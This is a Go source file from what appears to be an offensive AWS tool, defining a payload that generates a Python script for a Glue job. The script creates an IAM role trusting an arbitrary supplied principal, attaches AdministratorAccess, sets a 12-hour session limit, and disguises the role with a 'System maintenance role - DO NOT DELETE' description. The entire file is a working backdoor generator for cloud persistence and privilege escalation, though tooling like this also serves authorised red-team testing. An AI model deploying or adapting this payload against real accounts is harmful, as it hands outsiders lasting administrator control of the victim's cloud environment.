package glue

import (
	"fmt"
	"pathrunner/pkg/modules"
	"pathrunner/pkg/payloads"
)

type BackdoorCreateRolePayload struct{}

func init() {
	payloads.Register(&BackdoorCreateRolePayload{})
}

func (p *BackdoorCreateRolePayload) GetName() string {
	return "backdoor/create-role"
}

func (p *BackdoorCreateRolePayload) GetDescription() string {
	return "Create an IAM role with administrator privileges and a custom trust policy via Glue job"
}

func (p *BackdoorCreateRolePayload) GetTags() []string {
	return []string{
		payloads.TagServiceGlue,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorCreateRolePayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TRUST_PRINCIPAL",
			Description: "Trusted principal ARN (e.g. arn:aws:iam::123456789012:root) or service (e.g. lambda.amazonaws.com)",
			Required:    true,
		},
		{
			Name:        "ROLE_NAME",
			Description: "Name for the backdoor role (auto-generated if empty)",
			Required:    false,
			Default:     "",
		},
		{
			Name:        "EXTERNAL_ID",
			Description: "External ID condition for the trust policy (optional)",
			Required:    false,
			Default:     "",
		},
		{
			Name:        "ROLE_PATH",
			Description: "IAM path for the role",
			Required:    false,
			Default:     "/",
		},
	}
}

func (p *BackdoorCreateRolePayload) Validate(options map[string]string) error {
	if options["TRUST_PRINCIPAL"] == "" {
		return fmt.Errorf("TRUST_PRINCIPAL is required for backdoor/create-role payload")
	}
	return nil
}

func (p *BackdoorCreateRolePayload) GenerateCode(options map[string]string) (string, error) {
	trustPrincipal := options["TRUST_PRINCIPAL"]
	roleName := options["ROLE_NAME"]
	externalID := options["EXTERNAL_ID"]
	rolePath := options["ROLE_PATH"]
	if rolePath == "" {
		rolePath = "/"
	}

	roleNameDefault := "f'pathrunner-backdoor-{int(time.time())}'"
	if roleName != "" {
		roleNameDefault = fmt.Sprintf("'%s'", roleName)
	}

	externalIDArgParsing := ""
	externalIDCondition := ""
	externalIDOutput := ""
	assumeRoleExtra := ""

	if externalID != "" {
		externalIDArgParsing = fmt.Sprintf(`
    if arg == '--EXTERNAL_ID' and i + 1 < len(sys.argv):
        external_id = sys.argv[i + 1]`)

		externalIDCondition = fmt.Sprintf(`
    if external_id:
        trust_policy['Statement'][0]['Condition'] = {
            'StringEquals': {
                'sts:ExternalId': external_id
            }
        }`)

		externalIDOutput = `
    if external_id:
        print(f"External ID: {external_id}")`

		assumeRoleExtra = ` + (f" --external-id {external_id}" if external_id else "")`
	}

	externalIDDefault := "''"
	if externalID != "" {
		externalIDDefault = fmt.Sprintf("'%s'", externalID)
	}

	code := fmt.Sprintf(`import boto3
import json
import time
import sys

role_name = %s
trust_principal = '%s'
external_id = %s
role_path = '%s'

for i, arg in enumerate(sys.argv):
    if arg == '--ROLE_NAME' and i + 1 < len(sys.argv):
        role_name = sys.argv[i + 1]
    if arg == '--TRUST_PRINCIPAL' and i + 1 < len(sys.argv):
        trust_principal = sys.argv[i + 1]
    if arg == '--ROLE_PATH' and i + 1 < len(sys.argv):
        role_path = sys.argv[i + 1]%s

# Auto-detect principal type from format
principal_key = 'Service' if trust_principal.endswith('.amazonaws.com') else 'AWS'

trust_policy = {
    'Version': '2012-10-17',
    'Statement': [
        {
            'Effect': 'Allow',
            'Principal': {
                principal_key: trust_principal
            },
            'Action': 'sts:AssumeRole'
        }
    ]
}
%s
iam = boto3.client('iam')

try:
    role_response = iam.create_role(
        RoleName=role_name,
        AssumeRolePolicyDocument=json.dumps(trust_policy),
        Path=role_path,
        Description='System maintenance role - DO NOT DELETE',
        MaxSessionDuration=43200
    )
    role_arn = role_response['Role']['Arn']
    print(f"Created role: {role_arn}")

    iam.attach_role_policy(
        RoleName=role_name,
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    print(f"Attached AdministratorAccess to {role_name}")

    print(f"Trusted principal: {trust_principal}")%s
    print(f"\nTo assume this role:")
    print(f"  aws sts assume-role --role-arn {role_arn} --role-session-name pathrunner-session"%s)

except Exception as e:
    print(f"Error creating backdoor role: {e}")
    raise
`, roleNameDefault, trustPrincipal, externalIDDefault, rolePath,
		externalIDArgParsing, externalIDCondition, externalIDOutput, assumeRoleExtra)

	return code, nil
}

func (p *BackdoorCreateRolePayload) ProcessResult(result string) (string, error) {
	return result, nil
}

func (p *BackdoorCreateRolePayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	roleName := options["ROLE_NAME"]
	if roleName == "" {
		roleName = "pathrunner-backdoor-<timestamp>"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:role",
			Name:          roleName,
			CleanupMethod: "iam:DeleteRole",
			Metadata: map[string]string{
				"role_name":       roleName,
				"trust_principal": options["TRUST_PRINCIPAL"],
			},
		},
	}
}
